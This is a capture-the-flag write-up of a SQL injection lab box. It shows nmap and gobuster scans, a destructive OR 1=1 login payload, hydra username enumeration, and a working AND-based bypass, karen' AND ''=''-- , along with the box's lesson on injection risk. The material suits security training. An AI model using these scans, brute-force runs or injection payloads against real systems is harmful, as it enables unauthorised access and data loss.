# SQL Injection Challenge Writeup

## nmap scan:

```
nmap -sV -sS 10.10.157.160                                
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Then gobuster:

```
gobuster dir -u http://10.10.157.160/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

Starting gobuster in directory enumeration mode  
===============================================================  
```
/manual               (Status: 301) [Size: 315] [--> http://10.10.157.160/manual/]
```

---

## Then I tried to test an SQLi:
```
' OR '1'='1' -- 
```

And i got the message:  
> Oops! It looks like you injected an OR 1=1 or similar into the username field. This wouldn't have bypassed the login because every row in the users table was returned, 
and the login check only proceeds if one row matches the query.  
> 
> However, your injection also made it into a DELETE statement, and now the flag is gone. Like, completely gone. You need to reset the box to restore it, sorry.  
> 
> OR 1=1 is dangerous and should almost never be used for precisely this reason. Not even SQLmap uses OR unless you set --risk=3 (the maximum). Be better. Be like SQLmap.  
> 
> Lesson learned?  
> 
> P.S. maybe there is less destructive way to bypass the login...

And I had to restart the machine...

---

## Since I had nothing and couldn't use SQLi, I tried to find some users with hydra:

```
hydra -L /usr/share/wordlists/names.txt -p test123 10.10.102.103 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password" -f -V -o found_users.txt 
```

And found some users:

```
[80][http-post-form] host: 10.10.102.103   login: arnold   password: test123
[80][http-post-form] host: 10.10.102.103   login: karen   password: test123
[80][http-post-form] host: 10.10.102.103   login: kelly   password: test123
[80][http-post-form] host: 10.10.102.103   login: marcus   password: test123
[80][http-post-form] host: 10.10.102.103   login: martín   password: test123
[80][http-post-form] host: 10.10.102.103   login: martin   password: test123
[80][http-post-form] host: 10.10.102.103   login: naomi   password: test123
[80][http-post-form] host: 10.10.102.103   login: patrick   password: test123
[80][http-post-form] host: 10.10.102.103   login: sophia   password: test123
[80][http-post-form] host: 10.10.102.103   login: stuart   password: test123
[80][http-post-form] host: 10.10.102.103   login: verónica   password: test123
[80][http-post-form] host: 10.10.102.103   login: veronica   password: test123
```

---

## So I tried something risky, and tried another SQLi but now I had a user to try:

```
karen' AND ''=''-- 
```

It might behave differently if the database is doing user-specific filtering or expecting exact matches. The 'karen' part might help disguise the injection or target a specific user.

---

And... it actually worked. I got the flag, and this msessage:

> Well done! You bypassed the login without deleting the flag!  
> 
> If you're confused by this message, you probably didn't even try an SQL injection using something like OR 1=1. Good for you, you didn't need to learn the lesson.  
> 
> For everyone else who had to reset the box...lesson learned?  
> 
> Using OR 1=1 is risky and should rarely be used in real world engagements. Since it loads all rows of the table, it may not even bypass the login, 
if the login expects only 1 row to be returned. Loading all rows of a table can also cause performance issues on the database. 
However, the real danger of OR 1=1 is when it ends up in either an UPDATE or DELETE statement, since it will cause the modification or deletion of every row.  
> 
> For example, consider that after logging a user in, the application re-uses the username input to update a user's login status:  
> `UPDATE users SET online=1 WHERE username='<username>';`  
> 
> A successful injection of OR 1=1 here would cause every user to appear online. A similar DELETE statement, possibly to delete prior session data, could wipe session data for all users of the application.  
> 
> Consider using AND 1=1 as an alternative, with a valid input (in this case a valid username) to test / confirm SQL injection.
















